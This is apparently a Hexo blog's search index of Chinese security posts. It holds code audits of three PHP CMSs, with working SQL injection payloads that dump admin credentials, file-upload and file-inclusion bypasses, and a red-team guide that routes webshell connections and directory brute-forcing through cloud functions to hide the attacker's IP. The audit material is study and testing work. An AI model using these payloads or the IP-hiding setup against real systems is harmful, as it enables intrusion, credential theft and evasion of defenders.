<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>KKCMS v1.32审计</title>
      <link href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="KKCMS-v1-32审计"><a href="#KKCMS-v1-32审计" class="headerlink" title="KKCMS v1.32审计"></a>KKCMS v1.32审计</h1><h2 id="前台注入1"><a href="#前台注入1" class="headerlink" title="前台注入1"></a>前台注入1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/bplay.php?play=a AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</span></span><br></pre></td></tr></table></figure><h2 id="前台注入2"><a href="#前台注入2" class="headerlink" title="前台注入2"></a>前台注入2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#x27; AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND &#x27;qLKJ&#x27;=&#x27;qLKJ</span></span><br></pre></td></tr></table></figure><h2 id="未授权添加用户"><a href="#未授权添加用户" class="headerlink" title="未授权添加用户"></a>未授权添加用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/kkcms/ucenter/cms_user_add.php</span></span><br></pre></td></tr></table></figure><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1 AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</span></span><br></pre></td></tr></table></figure><p>这套一堆都是重复的注入</p><p>没意思 不写了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beescms V4.0审计</title>
      <link href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="beescms"><a href="#beescms" class="headerlink" title="beescms"></a>beescms</h1><h2 id="前台管理登录界面注入"><a href="#前台管理登录界面注入" class="headerlink" title="前台管理登录界面注入"></a>前台管理登录界面注入</h2><p><a href="http://127.0.0.1/beescms/admin/login.php">http://127.0.0.1/beescms/admin/login.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>()默认仅编码双引号</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$rel</span>=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,select database(),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;利用双写+空格绕过过滤<br>&#x2F;&#x2F;爆破表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like &#x27;</span>beescms<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect column_name fr from om information_schema.columns wh where ere table_name like &#x27;</span>bees_admin<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破admin账户名:admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect admin_name fr from om beescms.bees_admin limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;结合substr全部爆破密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,substr((selselectect admin_password fr from om beescms.bees_admin limit 0,1),3,32),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;21232f297a57a5a743894a0e4a801fc3很明显的md5函数处理：admin</p><h2 id="后台文件上传1"><a href="#后台文件上传1" class="headerlink" title="后台文件上传1"></a>后台文件上传1</h2><p>mime类型绕过<br><a href="http://127.0.0.1/beescms/admin/admin_pic_upload.php">http://127.0.0.1/beescms/admin/admin_pic_upload.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span>=<span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">up_img</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$size</span>,<span class="variable">$type</span>,<span class="variable">$thumb</span>=<span class="number">0</span>,<span class="variable">$thumb_width</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$thumb_height</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_alt</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_type</span>=<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_type</span>),<span class="variable">$type</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">msg</span>(<span class="string">&#x27;上传图片格式不正确&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只对Content-Type： 进行了对比<br>所以修改Content-Type： 即可进行文件上传绕过<br>Content-Disposition: form-data; name&#x3D;”up[]”; filename&#x3D;”1.php”<br>Content-Type: image&#x2F;png</p><h2 id="后台文件上传2"><a href="#后台文件上传2" class="headerlink" title="后台文件上传2"></a>后台文件上传2</h2><p>同样是mime类型绕过<br>up_img()函数<br><a href="http://127.0.0.1/beescms/admin/upload.php">http://127.0.0.1/beescms/admin/upload.php</a></p><h2 id="后台文件上传3"><a href="#后台文件上传3" class="headerlink" title="后台文件上传3"></a>后台文件上传3</h2><p><a href="http://127.0.0.1/beescms/admin/admin_sys.php">http://127.0.0.1/beescms/admin/admin_sys.php</a><br>修改允许上传文件类型<br>添加一个php类型<br>然后<br><a href="http://127.0.0.1/beescms/admin/admin_file_upload.php">http://127.0.0.1/beescms/admin/admin_file_upload.php</a><br>即可上传php文件</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熊海CMS V1.0审计</title>
      <link href="/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><a href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure><h2 id="前台文件包含"><a href="#前台文件包含" class="headerlink" title="前台文件包含"></a>前台文件包含</h2><p><a href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure><h2 id="后台文件包含"><a href="#后台文件包含" class="headerlink" title="后台文件包含"></a>后台文件包含</h2><p><a href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure><h2 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>addslashes 防SQL注入 转义单引号 ‘  &#39;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>; <span class="comment">//这里没用到单引号闭合 所以存在SQL注入</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防演练之云函数的利用</title>
      <link href="/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防演练之云函数的利用"><a href="#攻防演练之云函数的利用" class="headerlink" title="攻防演练之云函数的利用"></a>攻防演练之云函数的利用</h1><p>云函数（Serverless CloudFunction，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。</p><p>由于云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。也正是这一点，让我们无法代理像 SSH 这种需要长连接的服务，只能代理 HTTP(s) 这种无状态的协议。</p><p>云函数不能直接调用，同时还需要创建一个触发器来触发云函数，为了方便，我们选择使用API 网关触发器，只需要一个 HTTP 请求就能触发。</p><p><strong>腾讯云函数地址：</strong></p><p><a href="https://console.cloud.tencent.com/scf/index">https://console.cloud.tencent.com/scf/index</a></p><p>利用云函数的多出口、无需服务器承载的特性，我们可以在实战攻防演练中实现隐藏自身。</p><p>具体应用如下：</p><h3 id="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"><a href="#1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell" class="headerlink" title="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"></a>1、<strong>利用云函数API配置蚁剑实现隐藏自身IP连接Webshell</strong></h3><p> 首先创建云函数：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208011625530.png" alt="image-202208011625530"></p><p><strong>函数代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment">#忽略证书校验</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    _create_unverified_https_context = ssl._create_unverified_context</span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ssl._create_default_https_context = _create_unverified_https_context</span><br><span class="line">    </span><br><span class="line">user_agent = [<span class="string">&#x27;Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">requests_headers</span>():</span><br><span class="line">    UA = random.choice(user_agent)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: UA,</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;10.10.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>)), <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment">#url = unquote(event[&#x27;queryString&#x27;][&#x27;url&#x27;])</span></span><br><span class="line">    url = event[<span class="string">&#x27;queryString&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    agrs = event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> agrs.keys():</span><br><span class="line">        <span class="keyword">if</span> key != <span class="string">&quot;url&quot;</span>:</span><br><span class="line">            url += <span class="string">&quot;&amp;&quot;</span> +  key + <span class="string">&quot;=&quot;</span> + agrs[key]</span><br><span class="line">    method = event[<span class="string">&#x27;httpMethod&#x27;</span>]</span><br><span class="line">    headers = requests_headers()</span><br><span class="line">    <span class="comment">#headers = event[&#x27;headers&#x27;]</span></span><br><span class="line">    timeout = <span class="number">60</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = event[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        headers.update(&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;)</span><br><span class="line">        html = requests.post(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        html = requests.get(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(html.text))</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: html.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: html.text</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着在函数管理这里将执行超时时间设置为900秒</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020853243.png" alt="image-20220802085326165"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020854463.png" alt="image-20220802085338583"></p><p><strong>创建触发器：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852566.png" alt="image-20220802085206404"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852869.png" alt="image-20220802085237776"></p><p>会得到一个访问路径</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020858448.png" alt="image-20220802085845373"></p><p>利用蚁剑进行Webshell连接即可</p><p>路径为：</p><p><a href="https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell%E5%9C%B0%E5%9D%80">https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell地址</a></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020900807.png" alt="image-20220802090055742"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041881.png" alt="image-20220802104133594"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041975.png" alt="image-20220802104151793"></p><p>可以看到日志里的ip都是上海的</p><h2 id="2、联动dirsearch多出口爆破目录防BanIP"><a href="#2、联动dirsearch多出口爆破目录防BanIP" class="headerlink" title="2、联动dirsearch多出口爆破目录防BanIP"></a>2、联动dirsearch多出口爆破目录防BanIP</h2><p>首先下载一下SCF-Proxy</p><p>项目地址：<a href="https://github.com/hashsecteam/scf-proxy"><a href="https://github.com/Sakurasan/scf-proxy">GitHub - Sakurasan&#x2F;scf-proxy: 云函数代理服务</a></a></p><p>Go环境下编译一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh build.sh</span><br></pre></td></tr></table></figure><p>获得一个main.zip</p><p>接着在&#x2F;scf-proxy&#x2F;cmd 路径下编译一下 client.go</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -trimpath client.go</span><br></pre></td></tr></table></figure><p><strong>新建云函数</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021142219.png" alt="image-20220802114215068"></p><p><strong>创建触发器</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021143851.png" alt="image-20220802114341667"></p><p>同样别忘记了设置超时时间900秒</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021144244.png" alt="image-20220802114450106"></p><p>然后客户端设置监听</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="keyword">client</span> -p <span class="number">8888</span> -scfurl https:<span class="comment">//云函数访问路径</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021152005.png" alt="image-20220802115207900"></p><p>这里就算成功了</p><p>效果测试</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021200131.png" alt="image-20220802120024033"></p><p>使用dirsearch爆破目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxxxxx.com --proxy=http://localhost:8888</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021522846.png" alt="image-20220802152238700"></p><p><strong>效果如下：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021531279.png" alt="image-20220802153139164"></p><p>出口一直在变化</p>]]></content>
      
      
      <categories>
          
          <category> 红队基础设施 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队基础设施 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打点思路</title>
      <link href="/2022/05/17/%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/05/17/%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="内容已加密，请输入密码" />    <label for="pass">内容已加密，请输入密码</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞点位汇总——长期补充</title>
      <link href="/2022/04/27/SSRF%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BD%8D%E6%B1%87%E6%80%BB%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E8%A1%A5%E5%85%85/"/>
      <url>/2022/04/27/SSRF%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BD%8D%E6%B1%87%E6%80%BB%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF漏洞点位汇总——长期补充"><a href="#SSRF漏洞点位汇总——长期补充" class="headerlink" title="SSRF漏洞点位汇总——长期补充"></a>SSRF漏洞点位汇总——长期补充</h1><p>理论上任何带有URL请求的地方都是有可能存在SSRF的。</p><p>这里将各个场景补充一下，方便日后测试。</p><h2 id="1、文章转发点"><a href="#1、文章转发点" class="headerlink" title="1、文章转发点"></a>1、文章转发点</h2><p>转发–&gt;获取url参数数值–&gt;请求该地址–&gt;获取返回信息</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计特殊思路</title>
      <link href="/2022/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%89%B9%E6%AE%8A%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%89%B9%E6%AE%8A%E6%80%9D%E8%B7%AF/</url>
      
